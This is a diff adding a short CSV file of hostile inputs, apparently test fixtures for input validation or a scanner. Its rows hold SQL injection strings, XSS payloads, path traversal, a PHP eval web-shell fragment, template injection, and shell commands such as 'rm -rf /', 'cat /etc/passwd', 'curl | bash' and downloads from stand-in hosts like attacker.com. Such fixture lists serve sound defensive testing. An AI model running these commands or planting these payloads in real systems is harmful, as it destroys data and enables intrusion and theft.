@@ -1,0 +1,9 @@
+payload,script,command
+'; DROP TABLE users--,<script>alert('xss')</script>,rm -rf /
+1' OR '1'='1,<img src=x onerror=alert(1)>,cat /etc/passwd
+exec sp_executesql,<iframe src='evil.com'></iframe>,curl http://attacker.com
+UNION SELECT * FROM,<svg onload=fetch('/api/steal')>,curl | bash
+<!--<?php @eval($_POST[c]);?> -->,<body onload=alert('pwned')>,wget http://malware.com
+../../../etc/passwd,<marquee><alert>XSS</alert></marquee>,chmod 777 /
+%3Cscript%3E,<input type=button onclick=location='http://phish.com'>,dd if=/dev/zero
+${7*7},<object data='javascript:alert(1)'>,tar xf /dev/null
